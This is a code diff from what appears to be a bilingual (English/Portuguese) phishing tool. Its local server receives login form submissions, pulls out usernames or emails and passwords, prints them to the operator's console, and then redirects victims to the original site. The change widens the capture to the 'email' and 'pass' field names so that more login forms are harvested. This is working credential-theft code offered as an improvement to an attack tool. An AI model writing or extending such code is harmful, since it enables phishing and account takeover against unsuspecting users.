@@ -353,17 +353,17 @@ def run_local_server(target_url, language):
                 print("Received data:", data)
 
                 # Captura das credenciais
-                username = data.get('username', '')
-                password = data.get('password', '')
+                username = data.get('email', data.get('username', ''))
+                password = data.get('pass', data.get('password', ''))
 
                 # Exibir credenciais no console
                 if language == '1':
                     print(Fore.GREEN + Style.BRIGHT + "Credentials entered:".center(50))
-                    print(f"Username: {username}")
+                    print(f"Username/Email: {username}")
                     print(f"Password: {password}")
                 else:
                     print(Fore.GREEN + Style.BRIGHT + "Credenciais inseridas:".center(50))
-                    print(f"Nome de Usuário: {username}")
+                    print(f"Nome de Usuário/Email: {username}")
                     print(f"Senha: {password}")
 
                 # Redirecionar para a URL original após capturar as credenciais
